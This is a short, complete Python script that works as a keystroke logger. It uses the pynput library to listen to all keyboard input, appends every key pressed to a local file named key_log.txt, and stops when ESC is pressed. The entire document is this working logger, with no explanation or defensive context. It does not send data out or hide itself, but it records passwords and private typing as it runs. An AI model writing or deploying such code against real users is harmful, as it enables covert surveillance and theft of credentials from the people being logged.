from pynput.keyboard import Key, Listener

# File to store keystrokes
log_file = "key_log.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f" {key} ")

def on_release(key):
    # Stop listener with ESC key
    if key == Key.esc:
        return False

# Start listening
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

